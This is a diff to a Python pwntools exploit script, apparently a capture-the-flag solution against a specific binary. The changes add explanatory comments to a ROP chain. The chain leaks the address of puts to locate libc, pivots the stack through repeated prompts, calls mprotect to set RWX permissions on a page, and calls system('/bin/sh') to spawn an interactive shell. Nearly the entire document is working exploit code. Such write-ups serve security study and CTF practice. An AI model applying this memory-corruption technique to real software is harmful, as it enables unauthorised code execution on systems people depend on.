@@ -112,13 +112,18 @@ def prompti(i):
 #        prompt(b"2")
 #        prompt(str(p).encode())
 #        log.info(io.recvuntil(b"goodbye!\n"))
-#        io.close() 
+#        io.close()
+
+# stack pivot + libc leak + ret2main
 pop_rdi_rbp = 0x4025e0
 pop_rsp_rbp = 0x404ac7
 ret = 0x40201a
 rop = [0,pop_rdi_rbp, exe.got.puts, 0, exe.plt.puts, exe.sym.main]
+
 io = start()
-prompt(b"".join([p64(g) for g in rop]))
+prompt(b"".join([p64(g) for g in rop])) # putting rop chain in username
+
+# cursed shenanigans to pivot the stack
 good_prime = 59
 offset = 0x409eac
 for i in range(32):
@@ -131,13 +136,16 @@ for i in range(32):
         prompti(pop_rsp_rbp)
 prompti(2)
 prompti(offset)
+
+# computing libc address from the puts leak
 l = io.recvuntil(b"research").split(b"atomic ")[0][-7:-1]
 puts_addr = unpack(l,'all')
 log.info(f"puts : 0x{puts_addr:x}")
 libc = exe.libc
 libc.address = puts_addr - libc.sym.puts
 log.info((f"libc : 0x{libc.address:x}"))
-pivot = libc.address + 0x21e000
+
+# ret2system with a detour via mprotect to arrange page permissions in the executable
 pop_rdi = libc.address + 0x2a3e5
 pop_rsi = libc.address + 0xda97d
 pop_rdx_rbx = libc.address + 0x90529
@@ -145,8 +153,11 @@ pop_rdx_rbx = libc.address + 0x90529
 m_addr = 0x409000
 m_len = 0x1000
 prot = 0x7
+
 rop_mprotect = p64(pop_rdi) + p64(m_addr) + p64(pop_rsi) + p64(m_len) + p64(pop_rdx_rbx) + p64(prot)*2 + p64(libc.sym.mprotect)
 rop2 = rop_mprotect + p64(pop_rdi_rbp) +p64(next(libc.search(b'/bin/sh\x00')))*2 + p64(ret) + p64(libc.sym.system)
+
 prompt(b"a"*16 +rop2)
+
 io.interactive()
 
